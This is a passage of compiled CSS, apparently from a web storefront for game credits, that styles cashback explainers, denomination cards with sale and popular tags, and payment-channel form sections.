    background-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='360' height='233' fill='none'%3E%3Cpath d='M0 20C0 8.954 8.954 0 20 0h320c11.046 0 20 8.954 20 20v213H0V20z' fill='%23280031'/%3E%3C/svg%3E");
    background-size: cover;
    background-position: 50%;
    background-repeat: no-repeat
}

.cashback-explainer__header .wrapper[data-v-64db8779] {
    padding: 20px 16px 10px;
    background-image: url("data:image/svg+xml;charset=utf-8,%3Csvg width='360' height='155' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M0 20C0 8.954 8.954 0 20 0h320c11.046 0 20 8.954 20 20v135H0V20z' fill='url(%23paint0_linear_649_304525)'/%3E%3Cpath d='M175.812 0h12.913L222 131h-74L175.812 0z' fill='url(%23paint1_linear_649_304525)'/%3E%3Cpath d='M177 0h5l-6.5 131H128L177 0z' fill='url(%23paint2_linear_649_304525)'/%3E%3Cpath d='M170.05 0H176l-25.785 131H116L170.05 0z' fill='url(%23paint3_linear_649_304525)'/%3E%3Cpath d='M187 0h5.948L244 131h-30.235L187 0z' fill='url(%23paint4_linear_649_304525)'/%3E%3Cpath d='M12.053 96.112l1.048 5.161 3.668 3.78-5.161 1.048-3.78 3.668-1.048-5.161-3.668-3.78 5.161-1.049 3.78-3.667z' fill='%233F197F' fill-opacity='.5'/%3E%3Cpath d='M91.836 71.232l2.202 2.059 2.964.545-2.058 2.202-.546 2.964-2.202-2.058-2.964-.546 2.059-2.202.545-2.964zM295.517 73.216l1.305 2.717 2.564 1.584-2.717 1.305-1.584 2.564-1.305-2.717-2.564-1.584 2.717-1.305 1.584-2.564zM260.496 14.197l1.091 5.368 3.815 3.931-5.368 1.091-3.931 3.815-1.091-5.368-3.815-3.931 5.368-1.091 3.931-3.815z' fill='%233F197F'/%3E%3Cpath d='M327.748 30.886l2.978 4.597 4.988 2.265-4.598 2.978-2.265 4.988-2.978-4.598-4.988-2.265 4.598-2.978 2.265-4.987zM48.786 57.881l2.309 4.968 4.623 2.938-4.968 2.308-2.937 4.623-2.309-4.968-4.623-2.937 4.968-2.308 2.938-4.624z' fill='%233F197F' fill-opacity='.5'/%3E%3Cdefs%3E%3ClinearGradient id='paint0_linear_649_304525' x1='180' y1='0' x2='180' y2='155' gradientUnits='userSpaceOnUse'%3E%3Cstop stop-color='%236242FC' stop-opacity='.2'/%3E%3Cstop offset='1' stop-color='%23280031' stop-opacity='0'/%3E%3C/linearGradient%3E%3ClinearGradient id='paint1_linear_649_304525' x1='184.752' y1='-19.899' x2='184.925' y2='131' gradientUnits='userSpaceOnUse'%3E%3Cstop stop-color='%236242FC' stop-opacity='.3'/%3E%3Cstop offset='1' stop-color='%23280031'/%3E%3C/linearGradient%3E%3ClinearGradient id='paint2_linear_649_304525' x1='182' y1='-28.604' x2='184.234' y2='131.014' gradientUnits='userSpaceOnUse'%3E%3Cstop stop-color='%236242FC' stop-opacity='.37'/%3E%3Cstop offset='1' stop-color='%23280031'/%3E%3C/linearGradient%3E%3ClinearGradient id='paint3_linear_649_304525' x1='129.884' y1='-19.484' x2='128.151' y2='113.184' gradientUnits='userSpaceOnUse'%3E%3Cstop stop-color='%236242FC' stop-opacity='.2'/%3E%3Cstop offset='1' stop-color='%23280031'/%3E%3C/linearGradient%3E%3ClinearGradient id='paint4_linear_649_304525' x1='312.896' y1='53.063' x2='269.482' y2='132.743' gradientUnits='userSpaceOnUse'%3E%3Cstop stop-color='%236242FC' stop-opacity='.2'/%3E%3Cstop offset='1' stop-color='%23280031'/%3E%3C/linearGradient%3E%3C/defs%3E%3C/svg%3E");
    background-size: cover;
    background-position: 50%;
    background-repeat: no-repeat
}

.cashback-explainer__header .wrapper .close[data-v-64db8779] {
    position: absolute;
    top: 5px;
    padding: 5px;
    display: flex;
    justify-content: flex-end;
    cursor: pointer
}

[dir=ltr] .cashback-explainer__header .wrapper .close[data-v-64db8779] {
    right: 5px
}

[dir=rtl] .cashback-explainer__header .wrapper .close[data-v-64db8779] {
    left: 5px
}

.cashback-explainer__header .wrapper .img[data-v-64db8779] {
    text-align: center;
    margin-bottom: 16px
}

.cashback-explainer__header .wrapper .title[data-v-64db8779] {
    text-align: center;
    color: #fff;
    font-family: NotoSans-Bold, sans-serif;
    font-size: 1.25rem;
    margin-bottom: 20px
}

.cashback-explainer__header .wrapper .title[data-v-64db8779] .cashback-benefit {
    color: var(--color-secondary-main)
}

.cashback-explainer__items[data-v-64db8779] {
    padding: 0 16px;
    margin-bottom: 10px
}

.cashback-explainer__item[data-v-64db8779] {
    margin-top: 16px;
    display: flex;
    align-items: center
}

.cashback-explainer__item-icon[data-v-64db8779] {
    width: 10%
}

.cashback-explainer__item-text[data-v-64db8779] {
    display: flex;
    flex-direction: column;
    width: 90%;
    color: var(--color-light-6)
}

[dir=ltr] .cashback-explainer__item-text[data-v-64db8779] {
    text-align: left
}

[dir=rtl] .cashback-explainer__item-text[data-v-64db8779] {
    text-align: right
}

[dir=ltr] .cashback-explainer__item-text[data-v-64db8779] {
    margin-left: 10px
}

[dir=rtl] .cashback-explainer__item-text[data-v-64db8779] {
    margin-right: 10px
}

.cashback-explainer__item-text .title[data-v-64db8779] {
    font-family: NotoSans-SemiBold, sans-serif;
    font-size: 1rem;
    color: var(--color-text-dark)
}

.cashback-explainer__item-text .description[data-v-64db8779] {
    font-size: .875rem
}

.cashback-explainer__note[data-v-64db8779] {
    color: var(--color-text-dark);
    font-size: .875rem;
    padding: 10px 16px
}

.cashback-explainer__note .information[data-v-64db8779] {
    display: inline-flex;
    align-items: center;
    gap: 5px;
    font-family: NotoSans-SemiBold, sans-serif;
    margin-bottom: 5px
}

.cashback-explainer__note .information .icon[data-v-64db8779] {
    display: inline-flex
}

.cashback-explainer__note .information .text[data-v-64db8779] {
    font-size: 1rem
}

.cashback-explainer__actions[data-v-64db8779] {
    display: flex;
    flex-direction: column;
    justify-content: center;
    padding: 15px
}

.cashback-explainer__actions .learn-more[data-v-64db8779] {
    margin-top: 15px;
    color: var(--color-primary-main);
    font-size: .875rem;
    font-family: NotoSans-SemiBold, sans-serif;
    text-align: center;
    cursor: pointer
}

@keyframes fadeIn-data-v-6920df50 {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-6920df50 {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-6920df50]:export {
    breakpointLg: 992px
}

.cashback-info[data-v-6920df50] {
    display: flex;
    align-items: center;
    margin: 10px auto;
    font-family: NotoSans-SemiBold, sans-serif;
    font-size: .75rem;
    color: var(--color-text-dark);
    line-height: 18px;
    border-radius: 100px;
    background: var(--color-secondary-1);
    cursor: pointer
}

[dir=ltr] .cashback-info[data-v-6920df50] {
    padding-right: 5px
}

[dir=rtl] .cashback-info[data-v-6920df50] {
    padding-left: 5px
}

.cashback-info .icon[data-v-6920df50] {
    display: inline-flex
}

[dir=ltr] .cashback-info .message[data-v-6920df50] {
    margin-left: 5px
}

[dir=rtl] .cashback-info .message[data-v-6920df50] {
    margin-right: 5px
}

@keyframes fadeIn-data-v-95d3893a {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-95d3893a {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-95d3893a]:export {
    breakpointLg: 992px
}

.icon-color--smoke[data-v-95d3893a] {
    color: var(--color-light-main)
}

.icon-color--dark-matter[data-v-95d3893a] {
    color: var(--color-dark-main)
}

.icon-color--arcadia[data-v-95d3893a] {
    color: var(--color-tertiary-main)
}

.icon-color--portal[data-v-95d3893a] {
    color: var(--color-primary-main)
}

.icon-color--burst[data-v-95d3893a] {
    color: var(--color-secondary-main)
}

@keyframes fadeIn-data-v-46f504f4 {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-46f504f4 {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-46f504f4]:export {
    breakpointLg: 992px
}

.infobar[data-v-46f504f4] {
    box-shadow: 0 4px 22px rgba(0, 0, 0, .15)
}

.infobar-container[data-v-46f504f4] {
    width: 100%;
    background-color: var(--color-light-main)
}

.infobar-container.infobar-promo[data-v-46f504f4] {
    background-color: var(--color-secondary-main);
    color: var(--color-dark-main)
}

.infobar-container.infobar-alert[data-v-46f504f4] {
    background-color: var(--color-tertiary-main);
    color: var(--color-dark-main)
}

.infobar-content-wrapper[data-v-46f504f4] {
    display: flex;
    flex-direction: row;
    justify-content: space-between;
    align-items: center;
    font-size: .875rem;
    position: relative;
    margin: auto;
    text-align: center;
    padding: 20px 15px;
    max-width: 760px
}

.infobar-content[data-v-46f504f4] {
    width: 100%;
    padding: 0 20px
}

.infobar__close-btn[data-v-46f504f4] {
    cursor: pointer
}

.infobar.hide[data-v-46f504f4] {
    display: none
}

@media screen and (min-width:768px) {
    .infobar-content-wrapper[data-v-46f504f4] {
        max-width: 1280px
    }
}

@keyframes fadeIn-data-v-245724bc {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-245724bc {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-245724bc]:export {
    breakpointLg: 992px
}

.learn-more-tag[data-v-245724bc] {
    display: flex;
    align-items: center;
    gap: 2px;
    background-color: #f6f4ff;
    padding: 2px 4px;
    border-radius: 360px;
    color: var(--color-primary-main)
}

.learn-more-tag__text[data-v-245724bc] {
    font-family: NotoSans-SemiBold, sans-serif;
    font-size: 10px;
    line-height: 12px
}

@keyframes fadeIn-data-v-1660f6f4 {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-1660f6f4 {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-1660f6f4]:export {
    breakpointLg: 992px
}

.popular-tag[data-v-1660f6f4] {
    display: flex;
    align-items: center;
    padding: 0 8px;
    background: linear-gradient(90deg, #ff7f98, #6242fb);
    border-start-start-radius: 12px;
    border-start-end-radius: 12px;
    border-end-end-radius: 12px;
    border-end-start-radius: 0
}

.popular-tag__text[data-v-1660f6f4] {
    font-family: NotoSans-SemiBold, sans-serif;
    font-size: 10px;
    color: #fff
}

.popular-tag__shimmer[data-v-1660f6f4] {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: linear-gradient(135deg, hsla(0, 0%, 100%, 0) 40%, hsla(0, 0%, 100%, .4) 50%, hsla(0, 0%, 100%, 0) 60%);
    background-size: 300%;
    background-position-x: 100%;
    animation: shimmer-data-v-1660f6f4 2.5s linear infinite alternate;
    mix-blend-mode: overlay
}

@keyframes shimmer-data-v-1660f6f4 {
    0% {
        background-position: 0 0
    }

    to {
        background-position: 100% 100%
    }
}

@keyframes fadeIn-data-v-ebfe9a64 {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-ebfe9a64 {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-ebfe9a64]:export {
    breakpointLg: 992px
}

.flash-sale-tag[data-v-ebfe9a64] {
    display: flex;
    align-items: center;
    background-color: var(--color-yellow-3);
    color: var(--color-yellow-2);
    font-family: NotoSans-SemiBold, sans-serif;
    font-size: 10px;
    line-height: 12px;
    padding: 2px;
    border-radius: 4px
}

@keyframes fadeIn-data-v-520391ea {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-520391ea {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-520391ea]:export {
    breakpointLg: 992px
}

.rewards-tag[data-v-520391ea] {
    display: flex;
    align-items: center;
    gap: 3px;
    background-color: #f6f5fc;
    padding: 2px;
    border-radius: 4px
}

@keyframes fadeIn-data-v-8206b54a {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-8206b54a {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-8206b54a]:export {
    breakpointLg: 992px
}

.denom-card[data-v-8206b54a] {
    position: relative;
    list-style-type: none;
    margin: 0;
    padding: 10px 0 0;
    cursor: pointer
}

.denom-card.selected .denom-card__inner-container[data-v-8206b54a] {
    background: #e8e3ff;
    border-color: #d9d1ff
}

.denom-card.popular .denom-card__inner-container[data-v-8206b54a] {
    background: linear-gradient(#fff, #fff) padding-box, linear-gradient(135deg, #e04971, #ff7f98 12.5%, #feffde 25%, #6242fc 37.5%, #522be3 50%, #6242fc 62.5%, #feffde 75%, #ff7f98 87.5%, #e04971) border-box;
    background-size: 300%;
    border-color: transparent;
    animation: shimmerBackground-data-v-8206b54a 2.5s ease-in-out infinite alternate;
    border-start-start-radius: 0
}

.denom-card.popular.selected .denom-card__inner-container[data-v-8206b54a] {
    background: linear-gradient(#e8e3ff, #e8e3ff) padding-box, linear-gradient(135deg, #e04971, #ff7f98 12.5%, #feffde 25%, #6242fc 37.5%, #522be3 50%, #6242fc 62.5%, #feffde 75%, #ff7f98 87.5%, #e04971) border-box;
    background-size: 300%;
    border-color: transparent;
    animation: shimmerBackground-data-v-8206b54a 2.5s ease-in-out infinite alternate
}

.denom-card.sale[data-v-8206b54a] {
    -webkit-mask: linear-gradient(135deg, #000 40%, rgba(0, 0, 0, .333), #000 60%) right/400%;
    mask: linear-gradient(135deg, #000 40%, rgba(0, 0, 0, .333), #000 60%) right/400%;
    background-size: 300%;
    background-position: -175%;
    background-repeat: repeat;
    animation: shimmerMask-data-v-8206b54a 2.5s infinite
}

.denom-card.sale .denom-card__inner-container[data-v-8206b54a] {
    background: linear-gradient(#fff9f1, #fff9f1) padding-box, linear-gradient(135deg, #ffe6bb 30%, #fdb33e 50%, #ffe6bb 70%) border-box;
    background-size: 300%;
    border-color: transparent;
    animation: shimmerBackground-data-v-8206b54a 2.5s ease-in-out infinite alternate
}

.denom-card.sale.selected .denom-card__inner-container[data-v-8206b54a] {
    background: linear-gradient(#ffefd6, #ffefd6) padding-box, linear-gradient(135deg, #ffe6bb 30%, #fdb33e 50%, #ffe6bb 70%) border-box;
    background-size: 300%;
    border-color: transparent;
    animation: shimmerBackground-data-v-8206b54a 2.5s ease-in-out infinite alternate
}

.denom-card.popular.sale .denom-card__inner-container[data-v-8206b54a] {
    background: linear-gradient(#fff9f1, #fff9f1) padding-box, linear-gradient(135deg, #ffe6bb 30%, #fdb33e 50%, #ffe6bb 70%) border-box;
    background-size: 300%;
    border-color: transparent;
    animation: shimmerBackground-data-v-8206b54a 2.5s ease-in-out infinite alternate
}

.denom-card.popular.sale.selected .denom-card__inner-container[data-v-8206b54a] {
    background: #ffefd6;
    border-color: #ffe6bb
}

.denom-card.disabled[data-v-8206b54a] {
    filter: grayscale(100%);
    cursor: not-allowed;
    color: var(--color-light-4)
}

.denom-card.disabled.sale[data-v-8206b54a] {
    animation: none
}

.denom-card.disabled .denom-card__inner-container[data-v-8206b54a] {
    border-color: #d9d1ff;
    border-radius: 1em;
    animation: none
}

.denom-card .popular-tag[data-v-8206b54a] {
    position: absolute;
    top: 0;
    inset-inline-start: 0
}

.denom-card .denom-card__inner-container[data-v-8206b54a] {
    position: relative;
    display: flex;
    flex-direction: column;
    gap: .5em;
    height: 100%;
    padding: .75em .5em 1em;
    box-sizing: border-box;
    border-radius: 1em;
    border: 2px solid #d9d1ff;
    background-clip: padding-box
}

.denom-card .denom-card__inner-container .flash-sale-tag[data-v-8206b54a] {
    position: absolute;
    inset-inline-end: 8px;
    top: 8px
}

.denom-card .denom-card__inner-container .denom-section[data-v-8206b54a] {
    display: flex;
    margin-bottom: 8px;
    gap: 4px
}

.denom-card .denom-card__inner-container .denom-section__left .icon[data-v-8206b54a] {
    width: 48px;
    height: 48px
}

.denom-card .denom-card__inner-container .denom-section__right[data-v-8206b54a] {
    display: flex;
    flex-direction: column;
    align-items: flex-start;
    gap: 2px;
    width: 100%;
    text-align: left
}

.denom-card .denom-card__inner-container .denom-section__right[data-v-8206b54a]:dir(rtl) {
    text-align: right;
    direction: ltr;
    align-items: flex-end
}

.denom-card .denom-card__inner-container .denom-section__right .title[data-v-8206b54a] {
    font-family: NotoSans-SemiBold, sans-serif;
    font-size: 14px;
    line-height: 20px;
    color: #2f1236;
    overflow-wrap: anywhere
}

.denom-card .denom-card__inner-container .denom-section__right .title.is-sale[data-v-8206b54a] {
    width: 65%;
    word-wrap: normal
}

.denom-card .denom-card__inner-container .denom-section__right .sub-title[data-v-8206b54a] {
    font-family: NotoSans-SemiBold, sans-serif;
    font-size: 10px;
    line-height: 12px;
    color: #2f1236
}

.denom-card .denom-card__inner-container .denom-section__right .bonus-desc[data-v-8206b54a] {
    font-family: NotoSans-SemiBold, sans-serif;
    font-size: 10px;
    line-height: 12px;
    color: #3f3c4d
}

.denom-card .denom-card__inner-container .price-section[data-v-8206b54a] {
    display: flex;
    flex-direction: column;
    justify-content: flex-end;
    align-items: flex-end;
    height: 100%;
    text-align: right;
    font-family: NotoSans-Regular, sans-serif;
    font-size: 10px
}

.denom-card .denom-card__inner-container .price-section .icon[data-v-8206b54a] {
    max-width: 100%;
    height: 48px;
    margin: auto
}

.denom-card .denom-card__inner-container .price-section .price[data-v-8206b54a] {
    display: flex;
    flex-direction: column;
    align-items: flex-end;
    justify-content: flex-end;
    flex-wrap: wrap
}

.denom-card .denom-card__inner-container .price-section .price__prefix[data-v-8206b54a] {
    font-family: NotoSans-Regular, sans-serif;
    font-size: 10px;
    line-height: 12px;
    letter-spacing: 0;
    color: #f06383
}

.denom-card .denom-card__inner-container .price-section .price__price-container[data-v-8206b54a] {
    display: flex;
    align-items: center;
    gap: 4px
}

.denom-card .denom-card__inner-container .price-section .price__price-container__discount-tag[data-v-8206b54a] {
    font-family: NotoSans-SemiBold, sans-serif;
    font-size: 10px;
    background-color: #d5f7db;
    border-radius: 8px;
    line-height: 12px;
    letter-spacing: 0;
    color: #007547;
    padding: 0 4px
}

.denom-card .denom-card__inner-container .price-section .price__price-container__amount[data-v-8206b54a] {
    font-family: NotoSans-SemiBold, sans-serif;
    font-size: 14px;
    color: #f06383;
    line-height: 20px
}

.denom-card .denom-card__inner-container .price-section .usual-price[data-v-8206b54a] {
    font-family: NotoSans-SemiBold, sans-serif;
    font-size: 10px;
    line-height: 16px;
    text-align: right;
    color: #918da1
}

.denom-card .denom-card__inner-container .price-section .usual-price__amount[data-v-8206b54a] {
    text-decoration: line-through
}

.denom-card .denom-card__inner-container .price-section .rewards-tag[data-v-8206b54a] {
    display: flex;
    align-items: center;
    background-color: #f6f5fc;
    padding: 2px;
    border-radius: 4px
}

.denom-card .denom-card__inner-container .sale[data-v-8206b54a] {
    background: linear-gradient(135.19deg, rgba(255, 249, 241, 0) -20.2%, #fff -.08%, rgba(255, 249, 241, 0) 19.87%)
}

@keyframes shimmerMask-data-v-8206b54a {
    0% {
        -webkit-mask-position: 125% 0;
        mask-position: 125% 0
    }

    to {
        -webkit-mask-position: -25% 0;
        mask-position: -25% 0
    }
}

@keyframes shimmerBackground-data-v-8206b54a {
    0% {
        background-position: 0 0
    }

    to {
        background-position: 100% 100%
    }
}

@keyframes fadeIn-data-v-14cd4d92 {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-14cd4d92 {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-14cd4d92]:export {
    breakpointLg: 992px
}

.form-section__container[data-v-14cd4d92] {
    background-color: #fff;
    border-radius: 6px;
    padding: 15px;
    margin: 25px 0;
    animation: fadeIn-data-v-14cd4d92 1s ease;
    position: relative
}

.form-section__name[data-v-14cd4d92] {
    margin-top: 18px;
    color: var(--color-dark-main);
    max-width: 220px
}

[dir=ltr] .form-section__name[data-v-14cd4d92] {
    margin-left: 50px
}

[dir=rtl] .form-section__name[data-v-14cd4d92] {
    margin-right: 50px
}

.form-section__name-hide-index[data-v-14cd4d92] {
    margin-top: 18px;
    color: var(--color-dark-main)
}

.form-section__circle[data-v-14cd4d92] {
    flex-wrap: wrap;
    font-family: NotoSans-Bold, sans-serif;
    font-size: 1.25rem;
    margin: -30px 0 0;
    display: flex;
    justify-content: space-between;
    margin-bottom: 10px
}

.form-section__number[data-v-14cd4d92] {
    border: 4px solid #fff;
    border-radius: 50%;
    margin: 0;
    position: absolute;
    font-family: NotoSans-Bold, sans-serif;
    font-size: 1.25rem;
    line-height: 36px;
    width: 46px;
    height: 46px;
    text-align: center;
    -webkit-font-smoothing: subpixel-antialiased !important;
    -moz-osx-font-smoothing: grayscale !important;
    background-color: var(--color-primary-main);
    color: #fff
}

.form-section__denom-group[data-v-14cd4d92] {
    padding: 10px 0 0;
    margin: 0;
    list-style-type: none;
    display: flex;
    align-items: stretch;
    flex-wrap: wrap;
    height: auto
}

.form-section__empty-list[data-v-14cd4d92] {
    padding: 20px 0;
    text-align: center
}

.form-section__title-container[data-v-14cd4d92] {
    display: flex
}

.form-section__recent-transaction[data-v-14cd4d92] {
    margin-bottom: 10px
}

.form-section__invalid[data-v-14cd4d92] {
    align-self: flex-end;
    font-family: NotoSans-Regular, sans-serif
}

[dir=ltr] .form-section__invalid[data-v-14cd4d92] {
    margin-left: 50px
}

[dir=rtl] .form-section__invalid[data-v-14cd4d92] {
    margin-right: 50px
}

.form-section__denom-category[data-v-14cd4d92] {
    display: flex;
    flex-flow: row nowrap;
    padding: 0 0 15px 0;
    margin-bottom: 25px;
    overflow: auto
}

.form-section__denom-category.no-icon[data-v-14cd4d92] {
    margin-bottom: 12px
}

.form-section__sub-title[data-v-14cd4d92] {
    font-family: NotoSans-SemiBold, sans-serif;
    font-size: 1rem;
    line-height: 24px;
    letter-spacing: .02em;
    margin-top: 10px
}

.spinner-container[data-v-14cd4d92] {
    min-height: 250px
}

@media screen and (min-width:768px) {
    .form-section__name[data-v-14cd4d92] {
        max-width: 98%
    }

    [dir=ltr] .form-section__invalid[data-v-14cd4d92] {
        margin-left: 0
    }

    [dir=rtl] .form-section__invalid[data-v-14cd4d92] {
        margin-right: 0
    }
}

.denomination-card-group[data-v-14cd4d92] {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(146px, 1fr));
    gap: 12px 8px;
    padding: 0;
    margin: 0
}

@keyframes fadeIn-data-v-6514a331 {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-6514a331 {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-6514a331]:export {
    breakpointLg: 992px
}

.pixel-container[data-v-6514a331] {
    position: relative;
    height: 0
}

.pixel-container__pixel[data-v-6514a331] {
    position: absolute;
    margin-top: -24px;
    height: 2px;
    width: 100%
}

@keyframes fadeIn-data-v-7c24ba21 {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-7c24ba21 {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-7c24ba21]:export {
    breakpointLg: 992px
}

.form-section__container[data-v-7c24ba21] {
    background-color: #fff;
    border-radius: 6px
}

.form-section__wrapper[data-v-7c24ba21] {
    border-radius: 6px;
    padding: 15px;
    margin: 25px 0;
    animation: fadeIn-data-v-7c24ba21 1s ease;
    position: relative
}

.form-section__name[data-v-7c24ba21] {
    margin-top: 18px;
    color: var(--color-dark-main);
    max-width: 220px
}

[dir=ltr] .form-section__name[data-v-7c24ba21] {
    margin-left: 50px
}

[dir=rtl] .form-section__name[data-v-7c24ba21] {
    margin-right: 50px
}

.form-section__circle[data-v-7c24ba21] {
    font-family: NotoSans-Bold, sans-serif;
    font-size: 1.25rem;
    margin: -30px 0 0;
    display: flex;
    justify-content: space-between
}

.form-section__number[data-v-7c24ba21] {
    border: 4px solid #fff;
    border-radius: 50%;
    margin: 0;
    position: absolute;
    font-family: NotoSans-Bold, sans-serif;
    font-size: 1.25rem;
    line-height: 36px;
    width: 46px;
    height: 46px;
    text-align: center;
    -webkit-font-smoothing: subpixel-antialiased !important;
    -moz-osx-font-smoothing: grayscale !important;
    background-color: var(--color-primary-main);
    color: #fff
}

.form-section__number__subheader[data-v-7c24ba21] {
    font-size: .875rem;
    color: var(--color-dark-main);
    padding: 10px 0;
    margin: 0;
    display: block
}

@media screen and (min-width:768px) {
    .form-section__name[data-v-7c24ba21] {
        max-width: 98%
    }
}

@keyframes fadeIn-data-v-7a6c097c {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-7a6c097c {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-7a6c097c]:export {
    breakpointLg: 992px
}

.cashback-not-available[data-v-7a6c097c] {
    display: flex;
    font-size: .75rem;
    color: var(--color-text-dark);
    padding: 5px 16px
}

.cashback-not-available .icon-info[data-v-7a6c097c] {
    flex: 0 0 auto
}

[dir=ltr] .cashback-not-available .icon-info[data-v-7a6c097c] {
    margin-right: 10px
}

[dir=rtl] .cashback-not-available .icon-info[data-v-7a6c097c] {
    margin-left: 10px
}

.cashback-not-available .contents[data-v-7a6c097c] {
    display: flex;
    flex-direction: column;
    flex: 1
}

.cashback-not-available .turn-off-cashback[data-v-7a6c097c] {
    color: var(--color-primary-main);
    font-family: NotoSans-Bold, sans-serif;
    padding: 5px 0;
    width: -webkit-max-content;
    width: max-content
}

@keyframes fadeIn-data-v-1a422aba {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-1a422aba {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-1a422aba]:export {
    breakpointLg: 992px
}

.form-section__pc-container[data-v-1a422aba] {
    border: 1px solid var(--color-light-4);
    border-radius: 6px;
    margin: 10px 0;
    cursor: pointer
}

.form-section__pc-container.noTouch[data-v-1a422aba] {
    -webkit-tap-highlight-color: transparent;
    -webkit-touch-callout: none;
    -webkit-user-select: none;
    -ms-user-select: none;
    user-select: none
}

.form-section__pc-container.active[data-v-1a422aba] {
    background: var(--color-primary-6);
    border: 1px solid var(--color-primary-main)
}

.form-section__pc-container.disabled-element[data-v-1a422aba] {
    border: 1px solid var(--color-light-4);
    background: #fff
}

.form-section__payment-channel[data-v-1a422aba] {
    display: flex;
    align-items: center;
    flex-wrap: wrap;
    position: relative;
    min-height: 72px;
    justify-content: space-between
}

.form-section__pc-logo-container[data-v-1a422aba] {
    display: flex;
    width: 65%;
    justify-content: space-between;
    align-items: center
}

.form-section__pc-logo-container.pc-disabled[data-v-1a422aba] {
    width: 100%
}

.form-section__logo-wrapper[data-v-1a422aba] {
    margin: 0;
    padding: 12px 0
}

.form-section__logo-wrapper.large[data-v-1a422aba] {
    padding: 22px 0
}

.form-section__logo-wrapper .promotions__wrapper[data-v-1a422aba] {
    display: flex;
    align-items: center;
    gap: 10px
}

.form-section__logo-wrapper .promotions__wrapper .promotion-badge[data-v-1a422aba] {
    padding: 5px 0 0
}

[dir=ltr] .form-section__logo-wrapper .promotions__wrapper .promotion-badge[data-v-1a422aba] {
    padding-left: 16px
}

[dir=rtl] .form-section__logo-wrapper .promotions__wrapper .promotion-badge[data-v-1a422aba] {
    padding-right: 16px
}

.form-section__logo[data-v-1a422aba] {
    max-width: 95%;
    -o-object-fit: scale-down;
    object-fit: scale-down;
    max-height: 36px
}

[dir=ltr] .form-section__logo[data-v-1a422aba] {
    padding-left: 16px
}

[dir=rtl] .form-section__logo[data-v-1a422aba] {
    padding-right: 16px
}

[dir=ltr] .form-section__logo[data-v-1a422aba] {
    padding-right: 8px
}

[dir=rtl] .form-section__logo[data-v-1a422aba] {
    padding-left: 8px
}

.form-section__logo.disabled[data-v-1a422aba] {
    filter: grayscale(100%)
}

.form-section__how-it-works[data-v-1a422aba] {
    display: inline-block;
    font-size: .5rem;
    font-family: NotoSans-SemiBold, sans-serif;
    border: 1px solid var(--color-primary-main);
    padding: 4px;
    border-radius: 4px;
    text-align: center;
    max-width: 60px;
    color: var(--color-primary-main);
    cursor: pointer;
    text-transform: lowercase
}

.form-section__how-it-works[data-v-1a422aba]:first-letter {
    text-transform: uppercase
}

@media screen and (min-width:768px) {
    .form-section__how-it-works[data-v-1a422aba] {
        font-size: .75rem;
        max-width: 105px
    }
}

.form-section__price-container[data-v-1a422aba] {
    width: 34%;
    font-size: .75rem;
    letter-spacing: .12px
}

[dir=ltr] .form-section__price-container[data-v-1a422aba] {
    padding-right: 16px
}

[dir=rtl] .form-section__price-container[data-v-1a422aba] {
    padding-left: 16px
}

.form-section__price-container--disabled[data-v-1a422aba] {
    display: none
}

.form-section__price-deducted-discount[data-v-1a422aba],
.form-section__price-deducted-rewards[data-v-1a422aba],
.form-section__price-discount[data-v-1a422aba],
.form-section__price-strikethrough[data-v-1a422aba],
.form-section__price[data-v-1a422aba] {
    color: var(--color-dark-main);
    font-family: NotoSans-Bold, sans-serif;
    direction: ltr
}

[dir=ltr] .form-section__price-deducted-discount[data-v-1a422aba],
